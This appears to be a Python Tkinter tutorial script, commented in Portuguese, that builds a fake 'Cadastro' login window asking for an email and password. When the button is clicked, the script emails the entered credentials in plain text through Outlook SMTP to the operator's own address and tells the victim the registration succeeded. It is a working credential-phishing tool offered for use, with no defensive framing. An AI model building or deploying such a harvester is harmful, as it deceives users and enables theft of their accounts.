
## antes de tudo precisamos importar algumas bibliotecas para criar o servidor e a interface gráfica

from tkinter import* ## interface grafica
import smtplib ## servidor email
from email.mime.text import MIMEText ## servidor email
from email.mime.multipart import MIMEMultipart ## servidor email
from tkinter import messagebox ## interface gráfica

## Após importamos as bibliotecas necessárias vamos  começar a desenvolver
## Aqui criamos uma função que irá enviar as informações do usuario para o email desejado
# para que a função funcione e necessário que o python "leia" o scrypt antes de executa-lo
# por isso colocamos a def logo no inicio do scrypt

def enviar():
    server = None # aqui colocamos uma variavel server com um valor pre definido como none
    
    email_valor = entrada_nome.get() # estamos pegando o que tinha dentro das caixas de entrada do usuario
    senha_valor = entrada_nome2.get()# o mesmo aqui
    
    smtp_server = 'smtp-mail.outlook.com' ## Aqui colocamos qual servidor de email desejamos usar eu recomendo o outlook
    port = 587 # porta de serviço
    sender_email = 'seuemail@123' # seu email 
    password = 'suasenha' # sua senha

    # corpo do email
    message = MIMEMultipart()
    message['From'] = sender_email
    message['To'] = 'seu email'
    message['Subject'] = 'email'

    # aqui escrevemos o que tinha dentro daquelas variaveis do inicio do scrypt
    body = f'E-mail: {email_valor}\nSenha: {senha_valor}'
    message.attach(MIMEText(body, 'plain'))

    # tentando fazer a conexão e o envio do email
    try:
        server = smtplib.SMTP(smtp_server, port)
        server.starttls()
        server.login(sender_email, password)
        text = message.as_string()
        server.sendmail(sender_email, 'seu email', text)
        messagebox.showinfo('Sucesso', 'Cadastro realizado com sucesso!')  
        
    # caso ocorra erro ele ira mostrar na tela
    except Exception as e:
        print(f'Erro ao enviar o e-mail: {str(e)}')
        messagebox.showerror('Erro', f'Erro ao enviar o e-mail: {str(e)}')
    # caso flua bem ele ira finalizar a conexão 
    finally:
        if server is not None:
            server.quit()  

## INTERFACE GUI
            
## Aqui estamos criando uma interface de login simples para o usuario no qual ele devera inserir seu email e senha para prosseguir

informacoes = Tk() ## criamos uma variavel para usarmos como "variavel mãe"
informacoes.geometry("500x600") # tamanho da tela
informacoes.title("Cadastro") # nome da tela
informacoes.resizable(False, False) #impedimos que o usuario possa manipular o tamanho da tela
informacoes.configure(bg="Grey") # background da tela

enunciado= Label(informacoes, text="Seja bem vindo", bg="Grey", fg="White",font=60)
enunciado.pack(pady=20, padx=20)

informacoes_nome = Label(informacoes, text="Email", bg="Grey", fg="White")
informacoes_nome.pack(pady=10, padx=10)
entrada_nome = Entry(informacoes)
entrada_nome.pack(pady=10, padx=10)

informacoes_nome2 = Label(informacoes, text="Senha", bg="Grey", fg="White")
informacoes_nome2.pack(pady=20, padx=20)
entrada_nome2 = Entry(informacoes)
entrada_nome2.pack(pady=10, padx=10)

botao = Button(informacoes, text="Cadastro", fg="Black", command=enviar) # Aqui chamamos a função enviar quando o botão e clicado
botao.pack(pady=10, padx=10)

informacoes.mainloop() 